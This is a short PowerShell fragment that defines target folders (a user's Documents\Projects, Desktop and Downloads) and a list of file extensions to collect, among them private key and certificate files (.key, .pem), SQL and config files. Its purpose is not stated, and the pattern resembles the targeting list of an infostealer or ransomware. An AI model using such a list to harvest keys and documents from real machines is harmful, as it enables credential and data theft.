$targetPaths = @(
  'C:\Users\{userName}\Documents\Projects',
  'C:\Users\{userName}\Desktop',
  'C:\Users\{userName}\Downloads'
);
$extensions = @('*.docx','*.xlsx','*.pptx','*.pdf','*.csv','*.sql','*.conf','*.key','*.pem');
